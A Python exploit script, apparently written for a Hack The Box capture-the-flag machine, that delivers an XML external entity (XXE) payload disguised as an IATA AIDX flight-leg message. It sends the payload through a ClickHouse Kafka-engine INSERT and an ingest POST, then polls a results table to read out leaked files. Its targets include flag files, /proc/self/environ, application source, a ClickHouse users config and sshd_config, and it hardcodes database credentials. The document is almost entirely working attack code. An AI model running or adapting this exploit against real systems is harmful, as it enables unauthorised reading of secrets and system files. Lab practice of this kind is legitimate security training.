#!/usr/bin/env python3
"""AIDX XXE reader v2 - dual delivery (Kafka engine INSERT + ingest POST).

For every target it publishes the payload twice:
  1) ClickHouse  INSERT INTO partner_feed.flightleg_raw_kafka (raw) FORMAT RawBLOB
     (query in the URL, raw XML as the request body - byte safe)
  2) POST http://TARGET:8081/feeds/aidx
so the probe lands regardless of which producer path is live.

Then it polls partner_feed.flightleg_json once per tick for all tags, parses the
full `event` column as JSON (no regex truncation) and prints AirlineCode.

Usage:
    python3 xxe_read2.py                       # built-in priority list
    python3 xxe_read2.py file:///etc/hostname  # explicit targets (file:// or http://)
"""
import base64
import json
import os
import random
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

D = os.environ.get("D", "http://db.htb-airport.htb")
T = os.environ.get("T", "10.129.247.123")
INGEST = os.environ.get("INGEST", "http://%s:8081/feeds/aidx" % T)
AUTH = "Basic " + base64.b64encode(
    (os.environ.get("CHU", "svc_events") + ":" + os.environ.get("CHP", "Yl4aCgh4y2PnU")).encode()
).decode()

NS = "http://www.iata.org/IATA/2015/00/2016.1/FlightLegNotifRQ"

TARGETS = [
    "/proc/1/root/home/martin_cole/user.txt",
    "/proc/1/root/root/root.txt",
    "/proc/self/environ",
    "/opt/aidx-pipeline/app/ingest_api.py",
    "/opt/aidx-pipeline/app/api_app.py",
    "/etc/clickhouse-server/users.d/default.xml",
    "/var/log/syslog",
    "/etc/ssh/sshd_config",
]

RUN = "R" + "".join(random.choice("ABCDEFGHJKLMNPQRSTUVWXYZ23456789") for _ in range(4))
TICK, MAXT, CUT = 5, 24, 6000


def payload(sysid, tag):
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [<!ENTITY xxe SYSTEM "%s">]>\n'
        '<IATA_AIDX_FlightLegNotifRQ xmlns="%s"><Originator>ORA</Originator>\n'
        '<FlightLeg><FlightLegIdentifier><AirlineCode>&xxe;</AirlineCode>'
        '<FlightNumber>%s</FlightNumber>\n'
        '<DepartureAirport>ZZZ</DepartureAirport><ArrivalAirport>YYY</ArrivalAirport>'
        '<OriginDate>2026-10-28</OriginDate></FlightLegIdentifier>\n'
        '<LegIdentifier>%s</LegIdentifier><OperationalStatus>ACTIVE</OperationalStatus>'
        '</FlightLeg></IATA_AIDX_FlightLegNotifRQ>\n'
        % (sysid, NS, tag, tag)
    ).encode()


def ch(body, query=None, timeout=45):
    url = D + "/"
    if query:
        url += "?" + urllib.parse.urlencode({"query": query})
    req = urllib.request.Request(
        url, data=body, method="POST",
        headers={"Authorization": AUTH, "Content-Type": "text/plain"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:300].strip()
    except Exception as exc:  # noqa: BLE001
        return type(exc).__name__, ""


def deliver(sysid, tag):
    """Return (kafka_status, ingest_status)."""
    xml = payload(sysid, tag)
    code, body = ch(xml, "INSERT INTO partner_feed.flightleg_raw_kafka (raw) FORMAT RawBLOB")
    k = "%s%s" % (code, ("" if code == 200 else ":" + body.replace("\n", " ")[:80]))
    try:
        req = urllib.request.Request(INGEST, data=xml, method="POST",
                                     headers={"Content-Type": "application/xml"})
        with urllib.request.urlopen(req, timeout=30) as r:
            g = r.status
    except urllib.error.HTTPError as e:
        g = e.code
    except Exception as exc:  # noqa: BLE001
        g = type(exc).__name__
    return k, g


def walk(obj, key):
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k == key and isinstance(v, str):
                return v
        for v in obj.values():
            r = walk(v, key)
            if r is not None:
                return r
    elif isinstance(obj, list):
        for v in obj:
            r = walk(v, key)
            if r is not None:
                return r
    return None


def poll():
    q = ("SELECT event FROM partner_feed.flightleg_json WHERE event LIKE '%%%s%%' "
         "FORMAT JSONEachRow" % RUN)
    _, body = ch(b"", q)
    out = {}
    for line in body.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            row = json.loads(line)
        except Exception:  # noqa: BLE001
            continue
        ev = row.get("event")
        if isinstance(ev, str):
            try:
                ev = json.loads(ev)
            except Exception:  # noqa: BLE001
                continue
        tag, val = walk(ev, "FlightNumber"), walk(ev, "AirlineCode")
        if tag:
            out[tag] = "" if val is None else val
    return out


def main(argv):
    raws = argv[1:] or TARGETS
    sysids = [raw if "://" in raw else "file://" + raw for raw in raws]
    tagmap = {s: "%s%02d" % (RUN, i) for i, s in enumerate(sysids)}
    print("=" * 78)
    print("run %s   %d probe(s)" % (RUN, len(sysids)))
    print("=" * 78)
    for s in sysids:
        k, g = deliver(s, tagmap[s])
        print("%-52s tag=%s  kafka=%s  ingest=%s" % (s, tagmap[s], k, g))

    print("\npolling (max %ds)..." % (TICK * MAXT))
    got = {}
    for i in range(MAXT):
        rows = poll()
        for s, tg in tagmap.items():
            if s not in got and tg in rows:
                got[s] = rows[tg]
        print("  t=%3ds  %d/%d" % (i * TICK, len(got), len(tagmap)))
        if len(got) == len(tagmap):
            break
        time.sleep(TICK)

    print("\n" + "=" * 78 + "\nRESULTS\n" + "=" * 78)
    for s in sysids:
        print("\n#### %s" % s)
        if s not in got:
            print("  [no row - entity not resolved, or message never parsed]")
            continue
        v = got[s]
        if v == "":
            print("  [EMPTY - entity resolved to nothing / parser refused it]")
            continue
        if "HTB{" in v:
            print("  *** FLAG ***")
        print(v[:CUT])
        if len(v) > CUT:
            print("  ... [%d bytes total]" % len(v))


if __name__ == "__main__":
    main(sys.argv)
